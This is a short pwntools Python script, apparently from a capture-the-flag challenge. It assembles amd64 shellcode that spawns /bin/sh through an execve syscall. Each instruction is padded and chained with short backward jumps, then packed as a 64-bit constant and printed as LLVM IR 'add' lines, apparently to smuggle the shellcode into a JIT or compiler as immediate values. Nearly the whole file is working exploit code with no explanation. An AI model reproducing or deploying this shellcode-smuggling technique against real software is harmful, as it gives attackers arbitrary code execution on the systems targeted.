from pwn import *
context(arch='amd64', os='linux', endian='little')
if 0:
	print("  %2 = add nsw i64 %0, 256")
	for i in range(3, 313+3):
		s = "%"
		s = s + str(i) + " = add nsw i64 %" + str(i-1) + ", 256"
		print("  "+s)


# shellcode 

shellcode = [
	'mov edi, 0x68732f6e',
	'shl rdi, 24',
	'mov eax, 0x69622f',
	'add rdi, rax',
	'push rdi',
	'push rsp',
	'pop rdi',
	'xor rsi, rsi',
	'xor rdx, rdx',
	'push 59',
	'pop rax',
	'syscall'
]

scs = []
for i in shellcode:
	print(i+" : "+str(len(asm(i))))
	sc = asm(i).ljust(6, b'\x90') + b'\xeb\xeb'
	scs.append(u64(sc))
	print(disasm(sc))
	#print(u64(sc))

for i in range(7, 7+len(scs)):
	s = "%"+str(i)+" = add nsw i64 %"+str(i-1)+", "+str(scs[i-7])
	print(s)

